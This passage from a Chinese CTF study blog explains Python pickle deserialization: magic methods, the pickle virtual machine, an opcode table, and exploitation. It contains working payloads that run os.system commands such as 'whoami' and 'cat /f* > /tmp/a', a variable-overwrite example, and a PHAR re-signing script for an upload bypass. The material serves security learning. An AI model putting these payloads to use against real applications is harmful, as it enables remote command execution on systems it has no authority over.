<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read() </span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型和GBMB标识</span></span><br><span class="line">newf = s + sha256(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;newtest.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure>
<p>kali自带gzip压缩后更改为白名单后缀上传</p>
<p>访问<code>phar://upload/3.png</code></p>
<hr>
<h3 id="Pickle反序列化"><a href="#Pickle反序列化" class="headerlink" title="Pickle反序列化"></a>Pickle反序列化</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13498">pickle反序列化漏洞基础知识与绕过简析-先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2401_86640358/article/details/141905074">CTF题型 Python中pickle反序列化进阶利用&amp;amp；例题&amp;amp；opache绕过_python pickle ctf-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7032">pickle反序列化初探-先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sijidou/p/16305695.html">CTF-python pickle反序列化 - sijidou - 博客园</a></p>
<h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>pickle是Python的一个库,可以对一个对象进行序列化和反序列化操作.其中<code>__reduce__</code>魔法函数会在一个对象被反序列化时自动执行,我们可以通过在<code>__reduce__</code>魔法函数内植入恶意代码的方式进行任意命令执行.通常会利用到Python的反弹shell.</p>
<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><h5 id="python对象"><a href="#python对象" class="headerlink" title="python对象"></a>python对象</h5><p>在python中,对象的概念十分广泛.</p>
<blockquote>
<p>对象是数据和功能的结合体。Python是一种面向对象编程语言，它使用对象来组织代码和数据。在Python中，几乎所有的东西都是对象，包括整数、浮点数、列表、元组、字典、函数、类等。</p>
</blockquote>
<p>一个Python对象通常包含以下部分：</p>
<ol>
<li><strong>身份（Identity）</strong>：每个对象都有一个唯一的身份标识，通常是它的内存地址。可以使用内建函数<code>id()</code>来获取对象的身份</li>
<li><strong>类型（Type）</strong>：对象属于某种类型，比如整数、浮点数、字符串、列表等。可以使用内建函数<code>type()</code>来获取对象的类型</li>
<li><strong>值（Value）</strong>：对象所持有的数据。不同类型的对象有不同的值。例如，整数对象的值是整数值，字符串对象的值是字符序列</li>
<li><strong>属性（Attributes）</strong>：对象可以有零个或多个属性，这些属性是附加到对象上的数据。属性通常用于存储对象的状态信息</li>
<li><strong>方法（Methods）</strong>：对象可以有零个或多个方法，方法是附加到对象上的函数。这些方法定义了对象可以执行的操作</li>
</ol>
<h5 id="Python面向对象"><a href="#Python面向对象" class="headerlink" title="Python面向对象"></a>Python面向对象</h5><p>python是一门面向对象的语言.也正因为python面向对象的特性,使得我们有更加丰富的选择进行绕过</p>
<p>在Python中,面向对象的思想和php是一致的,只是定义类的代码,调用类函数和类属性的方式和php不同</p>
<p>python中用<code>.</code>调用实例的属性和方法</p>
<p>python中存在类属性和实例属性,实例属性只对一个实例生效,类属性对一个类生效.定义实例属性的方法是用<code>__init__</code>魔术方法.调用类属性的方法是<code>类名.变量名</code>或者<code>self.__class__.变量名</code></p>
<p>同样地,python的面向对象也有私有属性,私有方法,类的继承等</p>
<h5 id="关于序列化和反序列化的函数"><a href="#关于序列化和反序列化的函数" class="headerlink" title="关于序列化和反序列化的函数"></a>关于序列化和反序列化的函数</h5><ol>
<li><code>pickle.dump()</code></li>
<li><code>pickle.load()</code></li>
<li><code>pickle.dumps()</code></li>
<li><code>pickle.loads()</code></li>
</ol>
<p><strong>p = pickle.loads(urllib.unquote(become))</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回我看了师傅们的博客之后的理解就是，我们构建一</span><br></pre></td></tr></table></figure>
<p>个类，类里面的 <code>__reduce__</code>python魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用的函数为：</p>
<p><strong>pickle.dump(obj, file, [,protocol])</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">函数的功能：将obj对象序列化存入已经打开的file中。</span><br><span class="line">参数讲解：</span><br><span class="line">obj：想要序列化的obj对象。</span><br><span class="line">file:文件名称。</span><br><span class="line">protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</span><br></pre></td></tr></table></figure>
<p><strong>pickle.load(file)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">函数的功能：将file中的对象序列化读出。</span><br><span class="line">参数讲解：</span><br><span class="line">file：文件名称。</span><br></pre></td></tr></table></figure>
<p><strong>pickle.dumps(obj[, protocol])</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数的功能：将obj对象序列化为string形式，而不是存入文件中。</span><br><span class="line">参数讲解：</span><br><span class="line">obj：想要序列化的obj对象。</span><br><span class="line">protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</span><br></pre></td></tr></table></figure>
<p><strong>pickle.loads(string)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数的功能：从string中读出序列化前的obj对象。</span><br><span class="line">参数讲解：</span><br><span class="line">string：文件名称。</span><br><span class="line">【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码</span><br></pre></td></tr></table></figure>
<h5 id="python魔术方法"><a href="#python魔术方法" class="headerlink" title="python魔术方法"></a>python魔术方法</h5><p>和php类似,python魔术方法也会在一些特定情况下被自动调用.我们尤其要注意的是<code>__reduce__</code>魔术方法,这会在反序列化过程开始时被调用,所以我们可以序列化一个<code>__reduce__</code>魔术方法中有系统命令的实例并且让服务器将它反序列化,从而达到任意命令执行的效果</p>
<p>除此之外还有很多魔术方法.例如初始化函数<code>__init__</code>和构造函数<code>__new__</code>.和php类似,python中也有魔法属性.例如<code>__doc__</code>,<code>__name__</code>,<code>__class__</code>,<code>__base__</code>等</p>
<p><code>pickle.loads()</code>会在反序列化一个实例时自动引入没有引入的库</p>
<p>构造方法<code>__new__</code></p>
<ul>
<li>在实例化一个类时自动被调用,是类的构造方法</li>
<li>可以通过重写<code>__new__</code>自定义类的实例化过程</li>
</ul>
<p>初始化方法<code>__init__</code></p>
<ul>
<li>在<code>__new__</code>方法之后被调用,主要负责定义类的属性,以初始化实例</li>
</ul>
<p>析构方法<code>__del__</code></p>
<ul>
<li>在实例将被销毁时调用</li>
<li>只在实例的所有调用结束后才会被调用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__getattr__</span><br></pre></td></tr></table></figure>
<ul>
<li>获取不存在的对象属性时被触发</li>
<li>存在返回值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__setattr__</span><br></pre></td></tr></table></figure>
<ul>
<li>设置对象成员值的时候触发</li>
<li>传入一个self,一个要设置的属性名称,一个属性的值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__repr__</span><br></pre></td></tr></table></figure>
<ul>
<li>在实例被传入<code>repr()</code>时被调用</li>
<li>必须返回字符串</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__call__</span><br></pre></td></tr></table></figure>
<ul>
<li>把对象当作函数调用时触发</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__len__</span><br></pre></td></tr></table></figure>
<ul>
<li>被传入<code>len()</code>时调用</li>
<li>返回一个整型</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__str__</span><br></pre></td></tr></table></figure>
<ul>
<li>被<code>str()</code>,<code>format()</code>,<code>print()</code>调用时调用,返回一个字符串</li>
</ul>
<h5 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h5><p>栈是一种存储数据的结构.栈有压栈和弹栈两种操作</p>
<p>可以把栈看做一个弹夹,先进栈的数据后出栈,压栈就像压子弹,弹栈就像弹子弹</p>
<h5 id="什么是PVM"><a href="#什么是PVM" class="headerlink" title="什么是PVM"></a>什么是PVM</h5><p>pickle是一种栈语言,它由一串串opcode（指令集）组成.该语言的解析是依靠Pickle Virtual Machine （PVM）进行的</p>
<p>为什么要学习pickle?</p>
<blockquote>
<p>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对<code>opcode</code>的编写可以进行Python代码执行、覆盖变量等操作。直接编写的<code>opcode</code>灵活性比使用pickle序列化生成的代码更高，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</p>
</blockquote>
<p>PVM由以下三部分组成</p>
<ul>
<li>指令处理器：从流中读取 <code>opcode</code> 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。 最终留在栈顶的值将被作为反序列化对象返回</li>
<li>stack：由 Python 的 <strong><code>list</code></strong> 实现，被用来临时存储数据、参数以及对象</li>
<li>memo：由 Python 的 <strong><code>dict</code></strong> 实现，为 PVM 的整个生命周期提供存储</li>
</ul>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><div class="table-container">
<table>
<thead>
<tr>
<th>操作码</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
<th>memo 上的变化</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>c</code></td>
<td>获取一个全局对象或导入一个模块</td>
<td><code>c[module]n[instance]n</code></td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>o</code></td>
<td>寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象）</td>
<td><code>o</code></td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>i</code></td>
<td>相当于 <code>c</code> 和 <code>o</code> 的组合，先获取一个全局函数，然后寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td><code>i[module]n[callable]n</code></td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>N</code></td>
<td>实例化一个 None</td>
<td><code>N</code></td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>S</code></td>
<td>实例化一个字符串对象</td>
<td><code>S&#39;xxx&#39;n</code>（也可以使用双引号、<code>’</code> 等 Python 字符串形式）</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>V</code></td>
<td>实例化一个 UNICODE 字符串对象</td>
<td><code>Vxxxn</code></td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>I</code></td>
<td>实例化一个 int 对象</td>
<td><code>Ixxxn</code></td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>F</code></td>
<td>实例化一个 float 对象</td>
<td><code>Fx.xn</code></td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>R</code></td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td><code>R</code></td>
<td>函数和参数出栈，函数的返回值入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>.</code></td>
<td>程序结束，栈顶的一个元素作为 <code>pickle.loads()</code> 的返回值</td>
<td><code>.</code></td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td><code>(</code></td>
<td>向栈中压入一个 MARK 标记</td>
<td><code>(</code></td>
<td>MARK 标记入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>t</code></td>
<td>寻找栈中的上一个 MARK，并组合之间的数据为元组</td>
<td><code>t</code></td>
<td>MARK 标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>)</code></td>
<td>向栈中直接压入一个空元组</td>
<td><code>)</code></td>
<td>空元组入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>l</code></td>
<td>寻找栈中的上一个 MARK，并组合之间的数据为列表</td>
<td><code>l</code></td>
<td>MARK 标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>\]</code></td>
<td>向栈中直接压入一个空列表</td>
<td><code>\]</code></td>
<td>空列表入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>d</code></td>
<td>寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对）</td>
<td><code>d</code></td>
<td>MARK 标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>&#125;</code></td>
<td>向栈中直接压入一个空字典</td>
<td><code>&#125;</code></td>
<td>空字典入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>p</code></td>
<td>将栈顶对象储存至 memo_n</td>
<td><code>pnn</code></td>
<td>无</td>
<td>对象被储存</td>
</tr>
<tr>
<td><code>g</code></td>
<td>将 memo_n 的对象压栈</td>
<td><code>gnn</code></td>
<td>对象被压栈</td>
<td>无</td>
</tr>
<tr>
<td><code>0</code></td>
<td>丢弃栈顶对象</td>
<td><code>0</code></td>
<td>栈顶对象被丢弃</td>
<td>无</td>
</tr>
<tr>
<td><code>b</code></td>
<td>使用栈中的第一个元素（储存多个属性名：属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td><code>b</code></td>
<td>栈上第一个元素出栈</td>
<td>无</td>
</tr>
</tbody>
</table>
</div>
<p><strong>例如：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;cat /f* &gt; /tmp/a&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>解释：</strong></p>
<ol>
<li><code>(</code>：向栈中压入一个 MARK 标记</li>
<li><code>cos</code>：导入 <code>os</code> 模块</li>
<li><code>system</code>：获取 <code>os.system</code> 函数并压栈</li>
<li><code>S&#39;cat /f* &gt; /tmp/a&#39;</code>：将字符串 <code>&#39;cat /f* &gt; /tmp/a&#39;</code> 压栈</li>
<li><code>o.</code>：寻找栈中的上一个 MARK，以之间的第一个数据（<code>os.system</code> 函数）为 callable，第二个数据（字符串）为参数，执行该函数。<code>.</code> 表示程序结束，栈顶的一个元素作为 <code>pickle.loads()</code> 的返回值</li>
</ol>
<p><strong>1：栈的初始状态</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">栈底</span><br><span class="line">└── MARK (由 &#x27;(&#x27; 操作码压入)</span><br></pre></td></tr></table></figure>
<p><strong>2：导入 <code>os</code> 模块</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">栈底</span><br><span class="line">└── MARK</span><br><span class="line">    └── os模块 (由 &#x27;cos&#x27; 操作码压入)</span><br></pre></td></tr></table></figure>
<p><strong>3：获取 <code>os.system</code> 函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">栈底</span><br><span class="line">└── MARK</span><br><span class="line">    └── os模块</span><br><span class="line">        └── os.system函数 (由 &#x27;system&#x27; 操作码压入)</span><br></pre></td></tr></table></figure>
<p><strong>4：压入命令字符串</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">栈底</span><br><span class="line">└── MARK</span><br><span class="line">    └── os模块</span><br><span class="line">        └── os.system函数</span><br><span class="line">            └── &#x27;cat /f* &gt; /tmp/a&#x27;字符串 (由 &#x27;S&#x27; 操作码压入)</span><br></pre></td></tr></table></figure>
<p><strong>5：调用 <code>os.system</code> 函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">栈底</span><br><span class="line">└── MARK</span><br><span class="line">    └── os模块</span><br><span class="line">        └── os.system函数</span><br><span class="line">            └── &#x27;cat /f* &gt; /tmp/a&#x27;字符串</span><br></pre></td></tr></table></figure>
<p>执行 <code>o</code> 操作码后，<code>os.system</code> 函数被调用，参数为 <code>&#39;cat /f* &gt; /tmp/a&#39;</code>。栈中的 <code>MARK</code>、<code>os模块</code>、<code>os.system函数</code> 和命令字符串都被弹出，函数的返回值（如果有的话）会被压入栈</p>
<p><strong>6：结束序列化</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">栈底</span><br><span class="line">└── 函数返回值 (假设为 None)</span><br></pre></td></tr></table></figure>
<p>执行 <code>.</code> 操作码后，序列化过程结束，栈顶的值（None）作为 <code>pickle.loads()</code> 的返回值</p>
<p>也可以使用以下代码片段来生成Pickle序列化：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Payload</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;cat /f* &gt; /tmp/a&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">payload = Payload()</span><br><span class="line">serialized_payload = pickle.dumps(payload)</span><br><span class="line"><span class="built_in">print</span>(serialized_payload)</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazy.gif" data-original="pi2.png" alt=""></p>
<p>也可以将Pickle的代码变得可读起来（并非好读）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">miHoYo</span></span><br><span class="line"><span class="string">(S&#x27;miHoYo&#x27;</span></span><br><span class="line"><span class="string">S&#x27;Honkai StarRail&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickletools.dis(opcode)</span><br></pre></td></tr></table></figure>
<p><strong><code>db.</code></strong>:</p>
<ul>
<li><code>d</code> 操作码：从栈中弹出键值对（<code>&#39;secret&#39;</code> 和 <code>&#39;Hack!!!&#39;</code>），构建一个字典 <code>&#123;&#39;secret&#39;: &#39;Hack!!!&#39;&#125;</code>，并将其压入栈</li>
<li><code>b</code> 操作码：弹出栈顶的字典和前面的对象（假设是通过 <code>c__main__</code> 导入的 <code>secret</code> 对象），将字典中的属性绑定到对象上。即为 <code>secret</code> 对象添加一个属性 <code>&#39;secret&#39;</code>，其值为 <code>&#39;Hack!!!&#39;</code></li>
<li><code>.</code> 操作码：结束反序列化过程</li>
</ul>
<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><h5 id="覆盖变量"><a href="#覆盖变量" class="headerlink" title="覆盖变量"></a>覆盖变量</h5><p><strong>比如：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">miHoYo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line"></span><br><span class="line">m = miHoYo(<span class="string">&quot;Genshin Impact&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m.name)</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">m</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&#x27;Honkai StarRail&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(m.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pickletools.dis(opcode)</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/lazy.gif" data-original="pi3.png" alt=""></p>
<p>输出星穹铁道即代表成功覆盖了变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">opcode=b&quot;&quot;&quot;c__main__</span><br><span class="line">m#向栈中压入被实例化的m</span><br><span class="line">(S&#x27;name&#x27;#压入一个MARK,再压入一个&#x27;name&#x27;字符串</span><br><span class="line">S&#x27;Honkai StarRail&#x27;#压入一个ghd</span><br><span class="line">db.&quot;&quot;&quot;</span><br><span class="line">#d操作符弹出&#x27;name&#x27;和ghd,压入一个字典&#123;name:Honkai StarRail&#125;</span><br><span class="line">#b操作符弹出字典,并用字典中的键值对&#123;name:Honkai StarRail&#125;给s赋值(相当于执行了s的__init__),完成了篡改</span><br></pre></td></tr></table></figure>
<h5 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h5><p>相关的就是 <code>c</code>,<code>R</code>,<code>o</code>,<code>i</code>,<code>b</code>这几个操作符</p>
<p>与函数执行相关的opcode有三个： <code>R</code> 、 <code>i</code> 、 <code>o</code> ，所以我们可以从三个方向进行构造：</p>
<p><code>R</code> ：（<code>R</code> 操作符用于构建对象）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<p><code>tR</code>：其中 <code>t</code> 表示元组（tuple），<code>R</code> 表示调用 <code>os.system</code> 函数，并将字符串 <code>&#39;whoami&#39;</code> 作为参数传递给它</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system <span class="comment">#用c操作符引入os.system,也就是把os.system压入栈</span></span><br><span class="line">(S<span class="string">&#x27;ls&#x27;</span> <span class="comment">#先把MARK压入栈,再把ls压入栈</span></span><br><span class="line">tR. <span class="comment">#t操作符把ls出栈,元组(ls)入栈</span></span><br><span class="line">    <span class="comment">#R操作符把元组作为os.system的参数传入并执行</span></span><br><span class="line">&lt;=&gt; <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(*(<span class="string">&#x27;ls&#x27;</span>,))</span><br></pre></td></tr></table></figure>
<p><code>i</code> ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<p><code>i</code>像是<code>o</code>和<code>c</code>的结合,先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p>
<p><code>o</code> ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<h5 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.age = age</span><br><span class="line"></span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">Student</span></span><br><span class="line"><span class="string">(S&#x27;XiaoMing&#x27;</span></span><br><span class="line"><span class="string">S&quot;20&quot;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a=pickle.loads(data)</span><br><span class="line"><span class="built_in">print</span>(a.name,a.age)</span><br><span class="line"></span><br><span class="line"><span class="comment">#miHoYo 114514</span></span><br></pre></td></tr></table></figure>
<h4 id="例题-4"><a href="#例题-4" class="headerlink" title="例题"></a>例题</h4><h5 id="BUUCTF在线评测-Pickle-store"><a href="#BUUCTF在线评测-Pickle-store" class="headerlink" title="BUUCTF在线评测 Pickle store"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[watevrCTF-2019]Pickle Store">BUUCTF在线评测</a> Pickle store</h5><h5 id="BUUCTF在线评测-ikun"><a href="#BUUCTF在线评测-ikun" class="headerlink" title="BUUCTF在线评测 ikun"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019 华北赛区 Day1 Web2]ikun">BUUCTF在线评测</a> ikun</h5><p>要买到lv6，然而当前页面上没有lv6，就循环爆破出有 <code>lv6.png</code> 的页面</p>
